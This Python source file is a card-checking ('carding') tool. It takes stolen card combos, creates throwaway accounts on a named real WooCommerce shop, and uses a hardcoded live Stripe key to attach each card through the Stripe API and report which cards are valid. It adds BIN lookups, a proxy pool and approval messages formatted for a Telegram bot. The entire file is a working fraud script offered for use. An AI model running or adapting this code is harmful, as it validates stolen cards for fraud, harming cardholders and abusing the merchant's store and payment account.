import aiohttp
import asyncio
import re
import random
import string
import os
import logging
from datetime import datetime
import ssl
import json

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class AdvancedCardChecker:
    def __init__(self):
        self.proxy_pool = []
        self.load_proxies()
        self.request_timeout = aiohttp.ClientTimeout(total=70)
        self.max_concurrent = 3
        self.stripe_key = "pk_live_51IcTUHEZ8uTrpn7wTEclyYcnuG2kTGBaDYArq5tp4r4ogLSw6iE9OJ661ELpRKcP20kEjGyAPZtbIqwg3kSGKYTW00MHGU0Jsk"
        self.bin_cache = {}
        self.admin_username = "Vipvishal0"
        self.blacklist_file = 'blacklist.txt'
        self.blacklist = self.load_blacklist()
        self.save_blacklist()

    def load_proxies(self):
        if os.path.exists('proxies.txt'):
            with open('proxies.txt', 'r') as f:
                self.proxy_pool = [line.strip() for line in f if line.strip()]

    def load_blacklist(self):
        if os.path.exists(self.blacklist_file):
            with open(self.blacklist_file, 'r') as f:
                return set(line.strip() for line in f if line.strip())
        return set()

    def save_blacklist(self):
        with open(self.blacklist_file, 'w') as f:
            for bin in sorted(self.blacklist):
                f.write(bin + '\n')

    def generate_random_account(self):
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=4))
        return f"{name}{number}@yahoo.com"

    async def fetch_bin_info(self, bin_number):
        try:
            if bin_number in self.bin_cache:
                return self.bin_cache[bin_number]
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as response:
                    if response.status == 200:
                        data = await response.json()
                        self.bin_cache[bin_number] = {
                            'scheme': data.get('brand', 'N/A').capitalize(),
                            'type': data.get('type', 'N/A'),
                            'brand': data.get('brand', 'N/A').capitalize(),
                            'prepaid': 'N/A',
                            'country': data.get('country_name', 'N/A'),
                            'bank': data.get('bank', 'N/A'),
                            'level': data.get('level', 'N/A'),
                            'country_flag': data.get('country_flag', '')
                        }
                        return self.bin_cache[bin_number]
                    else:
                        logger.error(f"BIN lookup failed with status {response.status}")
                        return None
        except Exception as e:
            logger.error(f"BIN lookup error: {str(e)}")
            return None

    async def format_approval_message(self, combo, bin_info, check_time, user=None):
        bin_info = bin_info or {}
        username = user.username if user and user.username else user.full_name if user else 'Scraper'
        return f"""
<b>𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝✅</b>

[ϟ]𝘾𝘼𝙍𝘿 -» <code>{combo}</code>
[ϟ]𝙎𝙏𝘼𝙏𝙐𝙎 -» 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
[ϟ]𝙂𝘼𝙏𝙀𝙒𝘼𝙔 -» <code>𝐒𝐭𝐫𝐢𝐩𝐞</code>
<b>[ϟ]𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 -»: <code>Authenticated Successfully</code></b>

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[ϟ]𝘽𝙄𝙉 -» <code>{bin_info.get('scheme', 'N/A')} {bin_info.get('type', '')}</code>
[ϟ]𝘽𝘼𝙉𝙆 -» <code>{bin_info.get('bank', 'N/A')}</code>
<b>[ϟ]𝘾𝙊𝙐𝙉𝙏𝙍𝙔 -» <code>{bin_info.get('country', 'N/A')}</code></b>

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[⌬]𝙏𝙄𝙈𝙀 -» <code>{check_time:.2f}s</code>
<b>[⌬]𝐏𝐑𝐎𝐗𝐘 -» [ NONE ]</b>

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[⌬]𝐂𝐇𝐄𝐂𝐊𝐄𝐃 𝐁𝐘 -» @fn_only_approved
[⌬]𝐃𝐄𝐕 -» https://t.me/{self.admin_username}
[み]𝗕𝗼𝘁 -» @FN_CHECKERR_BOT
"""

    async def make_request(self, session, method, url, headers=None, data=None, retries=3):
        """Helper function to make HTTP requests with retries."""
        for attempt in range(retries):
            try:
                if method == 'get':
                    async with session.get(url, headers=headers) as response:
                        return response, await response.text()
                elif method == 'post':
                    async with session.post(url, headers=headers, data=data) as response:
                        return response, await response.text()
            except Exception as e:
                logger.warning(f"Request failed on attempt {attempt+1}/{retries} for {url}: {e}")
                if attempt < retries - 1:
                    await asyncio.sleep(1)
                else:
                    return None, None
        return None, None

    async def process_line(self, user_id, combo, semaphore):
        start_time = datetime.now()
        async with semaphore:
            try:
                # Parse combo
                parts = combo.strip().split("|")
                if len(parts) != 4:
                    logger.info(f"Invalid combo format: {combo}")
                    return None
                
                n, mm, yy, cvc = parts
                
                # Handle year format
                if "20" in yy:
                    yy = yy.split("20")[1]
                
                # Extract BIN and check blacklist
                bin_number = n[:6]
                if bin_number in self.blacklist:
                    logger.info(f"Skipping blacklisted BIN: {bin_number}")
                    return None
                
                # Generate random email
                email = self.generate_random_account()
                
                # Create SSL context
                ssl_context = ssl.create_default_context()
                ssl_context.set_ciphers('DEFAULT@SECLEVEL=1')
                ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
                
                # Headers for website requests
                headers = {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Cache-Control': 'max-age=0',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://fancyimpress.com',
                    'Referer': 'https://fancyimpress.com/my-account/',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                    'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"'
                }
                
                # Initialize aiohttp session
                async with aiohttp.ClientSession(timeout=self.request_timeout, connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
                    # Step 1: Fetch registration nonce
                    response, html = await self.make_request(
                        session, 'get', 
                        'https://fancyimpress.com/my-account/',
                        headers=headers
                    )
                    if not response or response.status != 200:
                        logger.info(f"Failed to fetch registration page: {response.status if response else 'No response'}")
                        return None
                    
                    nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html)
                    if not nonce_match:
                        logger.info("Failed to fetch registration nonce")
                        return None
                    nonce1 = nonce_match.group(1)
                    
                    # Step 2: Register account
                    data = {
                        'email': email,
                        'wc_order_attribution_source_type': 'typein',
                        'wc_order_attribution_referrer': '(none)',
                        'wc_order_attribution_utm_campaign': '(none)',
                        'wc_order_attribution_utm_source': '(direct)',
                        'wc_order_attribution_utm_medium': '(none)',
                        'wc_order_attribution_utm_content': '(none)',
                        'wc_order_attribution_utm_id': '(none)',
                        'wc_order_attribution_utm_term': '(none)',
                        'wc_order_attribution_utm_source_platform': '(none)',
                        'wc_order_attribution_utm_creative_format': '(none)',
                        'wc_order_attribution_utm_marketing_tactic': '(none)',
                        'wc_order_attribution_session_entry': 'https://fancyimpress.com/my-account/',
                        'wc_order_attribution_session_start_time': '2025-12-01 09:27:53',
                        'wc_order_attribution_session_pages': '2',
                        'wc_order_attribution_session_count': '2',
                        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                        'woocommerce-register-nonce': nonce1,
                        '_wp_http_referer': '/my-account/',
                        'register': 'Register'
                    }
                    
                    response, _ = await self.make_request(
                        session, 'post',
                        'https://fancyimpress.com/my-account/',
                        headers=headers,
                        data=data
                    )
                    if not response or response.status != 200:
                        logger.info(f"Failed to register account: {response.status if response else 'No response'}")
                        return None
                    
                    # Step 3: Fetch payment method nonce
                    response, html = await self.make_request(
                        session, 'get',
                        'https://fancyimpress.com/my-account/add-payment-method/',
                        headers=headers
                    )
                    if not response or response.status != 200:
                        logger.info(f"Failed to fetch payment page: {response.status if response else 'No response'}")
                        return None
                    
                    payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html)
                    if not payment_nonce_match:
                        logger.info("Failed to fetch payment nonce")
                        return None
                    payment_nonce = payment_nonce_match.group(1)
                    
                    # Step 4: Fetch BIN info
                    bin_info = await self.fetch_bin_info(bin_number)
                    
                    # Step 5: Create Stripe payment method
                    stripe_headers = {
                        'accept': 'application/json',
                        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                        'content-type': 'application/x-www-form-urlencoded',
                        'origin': 'https://js.stripe.com',
                        'priority': 'u=1, i',
                        'referer': 'https://js.stripe.com/',
                        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-site',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36'
                    }
                    
                    stripe_data = {
                        'type': 'card',
                        'card[number]': n,
                        'card[cvc]': cvc,
                        'card[exp_year]': yy,
                        'card[exp_month]': mm,
                        'allow_redisplay': 'unspecified',
                        'billing_details[address][postal_code]': '10006',
                        'billing_details[address][country]': 'US',
                        'pasted_fields': 'number',
                        'payment_user_agent': 'stripe.js/cba9216f35; stripe-js-v3/cba9216f35; payment-element; deferred-intent',
                        'referrer': 'https://fancyimpress.com',
                        'client_attribution_metadata[client_session_id]': '5e87df1d-037b-4347-bf59-a0275ab75d8c',
                        'client_attribution_metadata[merchant_integration_source]': 'elements',
                        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                        'client_attribution_metadata[merchant_integration_version]': '2021',
                        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                        'client_attribution_metadata[elements_session_config_id]': 'b355f674-ee2e-4ad4-8466-d4c4194efa13',
                        'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                        'guid': '709da624-dcd1-4705-ab97-bae288dcf2dbabb8f4',
                        'muid': 'd1756bf1-2ac1-4a34-b974-a6ec6e709b0f2eee97',
                        'sid': '4d7f4d0e-fe0b-4da9-9966-1f540326a434c5bdc1',
                        'key': self.stripe_key,
                        '_stripe_version': '2024-06-20'
                    }
                    
                    # Use separate session for Stripe to avoid cookie conflicts
                    async with aiohttp.ClientSession() as stripe_session:
                        stripe_response, stripe_text = await self.make_request(
                            stripe_session, 'post',
                            'https://api.stripe.com/v1/payment_methods',
                            headers=stripe_headers,
                            data=stripe_data
                        )
                        
                        if not stripe_response or stripe_response.status != 200:
                            logger.info(f"Stripe payment method creation failed: {stripe_response.status if stripe_response else 'No response'}")
                            return None
                        
                        try:
                            stripe_json = json.loads(stripe_text)
                        except json.JSONDecodeError:
                            logger.error("Invalid JSON response from Stripe")
                            return None
                        
                        if 'id' not in stripe_json:
                            logger.info("Stripe payment method creation failed: No payment ID")
                            return None
                        
                        payment_method_id = stripe_json['id']
                    
                    # Step 6: Add payment method to account
                    ajax_headers = {
                        'Accept': '*/*',
                        'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                        'Connection': 'keep-alive',
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Origin': 'https://fancyimpress.com',
                        'Referer': 'https://fancyimpress.com/my-account/add-payment-method/',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-origin',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                        'X-Requested-With': 'XMLHttpRequest',
                        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                    }
                    
                    ajax_data = {
                        'action': 'wc_stripe_create_and_confirm_setup_intent',
                        'wc-stripe-payment-method': payment_method_id,
                        'wc-stripe-payment-type': 'card',
                        '_ajax_nonce': payment_nonce,
                    }
                    
                    response, confirm_text = await self.make_request(
                        session, 'post',
                        'https://fancyimpress.com/wp-admin/admin-ajax.php',
                        headers=ajax_headers,
                        data=ajax_data
                    )
                    
                    if not response or response.status != 200:
                        logger.info(f"Payment confirmation failed: {response.status if response else 'No response'}")
                        return None
                    
                    # Check if payment succeeded
                    try:
                        res = json.loads(confirm_text)
                        success = res.get("success")
                        status = res.get("data", {}).get("status")
                        
                        if success is True and status == "succeeded":
                            check_time = (datetime.now() - start_time).total_seconds()
                            return {
                                'combo': combo,
                                'message': await self.format_approval_message(combo, bin_info, check_time),
                                'bin_info': bin_info,
                                'check_time': check_time
                            }
                        else:
                            logger.info(f"Payment confirmation failed for {combo}: {res.get('data', {}).get('message', 'No message')}")
                            return None
                    except json.JSONDecodeError:
                        logger.error("Invalid JSON response from payment confirmation")
                        return None
                    
            except Exception as e:
                logger.error(f"Error processing {combo}: {str(e)}")
                return None

    async def check_card(self, combo):
        user_id = "fn_only_approved"
        semaphore = asyncio.Semaphore(self.max_concurrent)
        result = await self.process_line(user_id, combo, semaphore)
        return result

# Example usage if run directly
if __name__ == "__main__":
    async def main():
        checker = AdvancedCardChecker()
        # Test with a single combo
        test_combo = "4111111111111111|12|2025|123"
        result = await checker.check_card(test_combo)
        if result:
            print("Success! Message:", result['message'])
        else:
            print("Failed or declined")
    
    asyncio.run(main())
